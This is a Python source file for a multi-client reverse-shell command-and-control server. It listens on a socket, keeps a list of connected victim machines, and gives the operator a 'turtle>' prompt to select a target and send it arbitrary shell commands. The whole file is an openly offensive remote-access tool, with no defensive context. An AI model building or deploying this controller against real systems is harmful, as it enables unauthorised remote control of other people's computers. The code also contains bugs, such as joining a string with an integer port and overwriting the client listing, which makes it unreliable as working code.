import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]

queue = Queue()
all_connections = []
all_addresses = []

# Creating Socket
def create_socket():
    try:
        global host
        global port
        global s
        host = '127.0.0.1'
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Error occured during creating of socket" + str(msg))

# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the sockets")
        s.bind((host, port))
        s.listen(5)
    except socket.error as mssg:
        print("Error during binding" + str(mssg))
        print("Retrying to bind...")
        bind_socket()

#1st Thread function -> Handle connections from multiple clients & saving it to lists
# Closing previous connection when this py file is restarted
def accepting_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    
    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1) # Prevents time-outs
            all_connections.append(conn)
            all_addresses.append(address)
            
            print("Connection established with "+address[0]+" on port number "+address[1])
        except:
            print("Error occured during accepting connections")    
            
#2nd Thread function -> 1) See all the clients
#                       2) Select a client
#                       3)Send commands to the selected client

# Interactive prompt to send commands
def start_turtle():
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
    # turtle> list
    # 0 A ip-adress
    # 1 B ip-adress
    # 2 C ip-adress
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognised")
        
        
# Display all current active connections
def list_connections():
    result = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(2048)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        result = str(i)+" "+str(all_addresses[i][0])+" "+str(all_addresses[i][1])+"\n"
    print("--------Clients-------"+"\n"+result)

# Selecting a target
#turtle> select 1

def get_target(cmd):
    try:
        target = cmd.replace('select ','') # Here we are deleting select from cmd so that we can get
                                           # exact id to which server wants to select or connect
        target = int(target)
        conn = all_connections[target]
        print("Connected to "+str(all_addresses[target][0]))
        print(str(all_addresses[target][0])+"> ", end="")
        return conn
    except:
        print("Selection not Valid")               
        return None

# Send commands
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                conn.close()
                s.close()
                sys.exit()
            if len(str.encode(cmd))>0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20840), 'utf-8')
                print(client_response, end="")
        except:
            print("Error while sending commands")
            
# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

# Do next jon that is in the queue --> (handle connections, send commands) 
def work():
    while True:
        x = queue.get()
        if x==1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x==2:
            start_turtle()
        queue.task_done()
        
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

create_workers()
create_jobs()
            